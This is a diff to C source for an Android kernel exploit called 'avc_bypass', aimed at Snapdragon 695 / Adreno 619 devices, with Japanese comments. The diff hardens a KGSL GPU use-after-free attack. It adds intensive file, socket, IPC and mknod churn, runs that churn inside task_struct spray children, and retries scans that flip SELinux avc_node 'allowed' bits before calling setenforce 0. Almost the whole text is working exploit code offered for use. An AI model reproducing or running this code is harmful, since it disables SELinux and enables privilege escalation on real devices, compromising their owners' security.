@@ -21,8 +21,15 @@
 #include <signal.h>
 #include <dirent.h>
 #include <pthread.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+#include <sys/sem.h>
+#include <sys/shm.h>
+#include <sys/sysmacros.h>
 
-/* ============ KGSL 定義（avc_bypass.h からコピー） ============ */
+/* ============ KGSL 定義 ============ */
 #define KGSL_IOC_TYPE 0x09
 
 struct kgsl_gpuobj_alloc {
@@ -150,7 +157,7 @@ static uint64_t detect_kaslr(void) {
     return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
 }
 
-/* ============ チャーン（簡易版） ============ */
+/* ============ チャーン（強化版） ============ */
 #define CHURN_MAX_PATHS 20000
 static char churn_paths[CHURN_MAX_PATHS][160];
 static int churn_npaths = 0;
@@ -192,36 +199,77 @@ static void churn_build(void) {
     printf("[CHURN] %d paths\n", churn_npaths);
 }
 
-static void churn_round(void) {
+/* 強力なチャーン：ランダムなパスに対して open/stat/access を繰り返す */
+static void churn_round_intensive(void) {
     churn_build();
+    // 既存のパスを開く
     for (int i = 0; i < churn_npaths; i++) {
         int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
         if (fd >= 0) close(fd);
+        // stat も呼ぶ
+        struct stat st;
+        stat(churn_paths[i], &st);
+        // access も呼ぶ
+        access(churn_paths[i], R_OK);
     }
-    // 追加の AVC トリガー：いくつかのシステムコールを発行
+
+    // 存在しないパスも大量に試す（AVC チェックが必ず発生）
+    char fake_path[256];
+    for (int i = 0; i < 10000; i++) {
+        snprintf(fake_path, sizeof(fake_path), "/proc/self/fd/%d", i);
+        int fd = open(fake_path, O_RDONLY);
+        if (fd >= 0) close(fd);
+        snprintf(fake_path, sizeof(fake_path), "/sys/kernel/security/%d", i);
+        fd = open(fake_path, O_RDONLY);
+        if (fd >= 0) close(fd);
+    }
+
+    // ソケット、IPC なども使用
+    int s = socket(AF_INET, SOCK_STREAM, 0);
+    if (s >= 0) { close(s); }
+    s = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (s >= 0) {
+        struct sockaddr_un su = { .sun_family = AF_UNIX };
+        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
+        bind(s, (struct sockaddr *)&su, sizeof(su));
+        close(s);
+        unlink("/data/local/tmp/cs.sock");
+    }
+    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
+    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
+    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
+    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
+
+    // enforce の書き込みも繰り返す（AVC チェックが発生）
     for (int i = 0; i < 100; i++) {
-        int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
+        int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
         if (fd >= 0) { write(fd, "1", 1); close(fd); }
         usleep(50);
     }
 }
 
-/* ============ 子プロセススプレー ============ */
+/* ============ 子プロセススプレー（各子でチャーンを実行させる） ============ */
 static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
 
-static void spawn_spray(void) {
-    printf("[SPRAY] spawning...\n");
+static void spawn_spray_with_churn(void) {
+    printf("[SPRAY] spawning with churn in each child...\n");
     for (int i = 0; i < SPRAY_PIDS; i++) {
         pid_t p = fork();
         if (p == 0) {
             prctl(PR_SET_NAME, "TASKUAF!!");
+            // 各子プロセスで多数のファイルアクセスを行い、AVC ノードを生成
+            for (int j = 0; j < 50; j++) {
+                churn_round_intensive();
+                usleep(10000);
+            }
+            // その後、無限ループで待機
             for (;;) usleep(200000);
         }
         if (p > 0) spray_pids[n_spray++] = p;
         else break;
     }
-    printf("[SPRAY] %d children\n", n_spray);
+    printf("[SPRAY] %d children spawned\n", n_spray);
 }
 
 static void kill_spray_children(void) {
@@ -267,11 +315,11 @@ static int scan_and_flip_cpu(void *start, size_t size, int verbose) {
     return flips;
 }
 
-/* ============ main ============ */
+/* ============ メイン ============ */
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - CPU mapping UAF\n");
-    printf("[*] Strategy: UAF + CPU scan + flip allowed\n");
+    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - CPU mapping UAF (強化版)\n");
+    printf("[*] Strategy: UAF + intensive churn + CPU scan + flip allowed\n");
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
@@ -315,17 +363,19 @@ int main(int argc, char **argv) {
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(10000);
 
-    // ---- Phase 4: task_struct スプレー（UAF ページを占有） ----
-    spawn_spray();
+    // ---- Phase 4: task_struct スプレー（各子でチャーンを実行） ----
+    spawn_spray_with_churn();
 
-    // ---- Phase 5: 子プロセスを kill してページを解放 ----
+    // ---- Phase 5: 子プロセスを kill してページを解放（avc_node を含むページが残る） ----
     kill_spray_children();
     usleep(100000);
 
-    // ---- Phase 6: チャーン（AVC ノードを同じページに割り当て） ----
-    printf("[*] Phase 6: Churn to allocate avc_nodes in UAF pages\n");
-    churn_build();
-    for (int c = 0; c < 3; c++) churn_round();
+    // ---- Phase 6: さらにチャーン（avc_node をより多く割り当てる） ----
+    printf("[*] Phase 6: Intensive churn to allocate avc_nodes\n");
+    for (int c = 0; c < 5; c++) {
+        churn_round_intensive();
+        printf("[CHURN] round %d done\n", c+1);
+    }
 
     // ---- Phase 7: CPU マッピングをスキャンして AVC ノードを探し、allowed をフリップ ----
     printf("[*] Phase 7: Scan UAF region (CPU mapping) for avc_nodes and flip allowed\n");
@@ -335,8 +385,18 @@ int main(int argc, char **argv) {
     // キャッシュの一貫性のため、CPU キャッシュをフラッシュ（必要なら）
     __sync_synchronize();
 
-    // ---- Phase 8: setenforce 0 を試行 ----
-    printf("[*] Phase 8: Trying setenforce 0\n");
+    // ---- Phase 8: フリップが0だった場合、再度チャーンとスキャンを繰り返す ----
+    if (flips == 0) {
+        printf("[!] No AVC nodes found. Retrying with more churn...\n");
+        for (int retry = 0; retry < 3 && flips == 0; retry++) {
+            churn_round_intensive();
+            flips = scan_and_flip_cpu(uaf_map, UAF_SIZE, 1);
+            printf("[*] Retry %d: flips=%d\n", retry+1, flips);
+        }
+    }
+
+    // ---- Phase 9: setenforce 0 を試行 ----
+    printf("[*] Phase 9: Trying setenforce 0\n");
     int ok = try_setenforce0();
     if (!ok) {
         printf("[!] First attempt failed, waiting and retrying...\n");
